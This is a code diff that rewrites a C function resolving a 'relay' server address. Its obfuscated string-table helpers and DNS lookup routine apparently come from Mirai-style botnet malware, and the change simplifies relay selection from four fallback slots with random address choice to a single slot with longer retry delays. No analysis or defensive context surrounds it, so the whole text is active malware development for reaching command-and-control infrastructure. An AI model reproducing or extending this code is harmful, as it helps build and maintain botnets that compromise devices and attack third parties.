@@ -43,60 +43,49 @@ static void establish_connection(void);
 extern struct sockaddr_in srv_addr;
 
 #ifdef RELAY_MODE
-static void resolve_relay_addr(void)
-{
+static void resolve_relay_addr(void) {
+    struct resolv_entries *entries;
     srv_addr.sin_family = AF_INET;
+    srv_addr.sin_port = htons(RELAY_PORT);
 
-    // Try all 4 possible relay slots
-    for (int attempt = 0; attempt < 4; attempt++)
-    {
-        int relay_index = TABLE_RELAY_1 + attempt;
-        table_unlock_val(relay_index);
-        char *relay_domain = table_retrieve_val(relay_index, NULL);
-        
-        if (relay_domain == NULL || util_strlen(relay_domain) == 0)
-        {
-            table_lock_val(relay_index);
-            continue;
-        }
-        
-#ifdef DEBUG
-        printf("[relay] Trying relay: %s\n", relay_domain);
-#endif
-        
-        struct resolv_entries *entries = NULL;
-        int retries = 3;
-        
-        while (retries >= 0 && entries == NULL)
-        {
-            entries = resolv_lookup(relay_domain);
-            if (entries == NULL)
-            {
-                retries--;
-                if (retries >= 0)
-                    sleep(1);
-            }
-        }
-        
-        table_lock_val(relay_index);
-        
-        if (entries != NULL && entries->addrs_len > 0)
-        {
-            srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
-            srv_addr.sin_port = htons(RELAY_PORT);
-            resolv_entries_free(entries);
-#ifdef DEBUG
-            printf("[relay] Connected to relay successfully\n");
-#endif
-            return;
-        }
-        
-        if (entries)
-            resolv_entries_free(entries);
+    table_unlock_val(TABLE_RELAY_1);
+    char *domain = table_retrieve_val(TABLE_RELAY_1, NULL);
+    
+    if (domain == NULL || util_strlen(domain) == 0) {
+        table_lock_val(TABLE_RELAY_1);
+        return;
     }
     
 #ifdef DEBUG
-    printf("[relay] All relays failed to resolve!\n");
+    printf("[relay] Resolving relay: %s\n", domain);
+#endif
+    
+    int retries = 3;
+    entries = NULL;
+    
+    while (retries > 0 && entries == NULL) {
+        entries = resolv_lookup(domain);
+        if (entries == NULL) {
+            retries--;
+            if (retries > 0)
+                sleep(2);
+        }
+    }
+    
+    table_lock_val(TABLE_RELAY_1);
+    
+    if (entries == NULL) {
+#ifdef DEBUG
+        printf("[relay] Failed to resolve relay domain\n");
+#endif
+        return;
+    }
+    
+    srv_addr.sin_addr.s_addr = entries->addrs[0];
+    resolv_entries_free(entries);
+    
+#ifdef DEBUG
+    printf("[relay] Relay resolved successfully\n");
 #endif
 }
 #endif
